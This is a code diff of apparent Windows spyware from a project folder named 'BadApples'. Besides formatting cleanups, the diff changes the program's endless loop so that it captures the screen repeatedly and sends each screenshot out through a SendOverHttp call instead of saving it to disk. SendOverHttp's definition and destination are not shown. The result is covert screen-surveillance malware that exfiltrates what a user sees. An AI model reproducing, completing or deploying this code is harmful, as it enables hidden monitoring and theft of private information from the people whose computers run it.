@@ -1,16 +1,16 @@
 #include <windows.h>
 #include <Shlwapi.h>
 #include <stdio.h>
-#include "..\BadApples\common.h"
+#include "../BadApples/common.h"
 
 #pragma comment(lib, "Shlwapi.lib")
 
-PVOID CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
+PVOID CopyMemoryEx( _Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length )
 {
-	PBYTE D = (PBYTE)Destination;
-	PBYTE S = (PBYTE)Source;
+	PBYTE D = Destination;
+	PBYTE S = Source;
 
-	while (Length--)
+	while ( Length-- )
 		*D++ = *S++;
 
 	return Destination;
@@ -38,7 +38,7 @@ BOOL WriteFileToDiskW( IN LPCWSTR cFileName, IN PBYTE pFileBuffer, OUT DWORD dwF
 		dwNumberOfBytesWritten )
 	{
 		//printf( "[!] WriteFile Failed With Error: %d \n[i] Wrote %d Of %d Bytes \n", GetLastError(),
-		        //dwNumberOfBytesWritten, dwFileSize );
+		//dwNumberOfBytesWritten, dwFileSize );
 	}
 
 _END_OF_FUNC:
@@ -171,9 +171,11 @@ BOOL ScreenshotBmp(
 	// memory buffer including the file and information
 	// headers and image bits 
 	CopyMemoryEx( *Buffer, &BmpFileHeader, sizeof( BmpFileHeader ) );
-	CopyMemoryEx( ( ( PBYTE )( *Buffer ) + U_PTR( sizeof( BmpFileHeader ) ) ), &BmpInfoHeader, sizeof( BmpInfoHeader ) );
-	CopyMemoryEx( ( ( PBYTE )( *Buffer ) + U_PTR( sizeof( BmpFileHeader ) ) + U_PTR( sizeof( BmpInfoHeader ) ) ), BitsBuf,
-	        BitsLen );
+	CopyMemoryEx( ( ( PBYTE )( *Buffer ) + U_PTR( sizeof( BmpFileHeader ) ) ), &BmpInfoHeader,
+	              sizeof( BmpInfoHeader ) );
+	CopyMemoryEx( ( ( PBYTE )( *Buffer ) + U_PTR( sizeof( BmpFileHeader ) ) + U_PTR( sizeof( BmpInfoHeader ) ) ),
+	              BitsBuf,
+	              BitsLen );
 
 	Success = TRUE;
 
@@ -222,23 +224,22 @@ int main( void )
 
 	StrCatW( lpTempDir, L"Screenshot.bmp" );
 
-	while (TRUE) {
-
-
-		if (!ScreenshotBmp(&pBuffer, &uLong))
+	while ( TRUE )
+	{
+		if ( !ScreenshotBmp( &pBuffer, &uLong ) )
 		{
 			return -1;
 		}
 
-		if (!WriteFileToDiskW(lpTempDir, pBuffer, uLong))
+		if ( !SendOverHttp( pBuffer, uLong ) )
 		{
 			return -1;
 		}
 
-		RtlSecureZeroMemory(pBuffer, uLong);
-		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer);
+		RtlSecureZeroMemory( pBuffer, uLong );
+		HeapFree( GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer );
 
-		Sleep(SS_COOLDOWN);
+		Sleep( SS_COOLDOWN );
 	}
 
 	return 0;
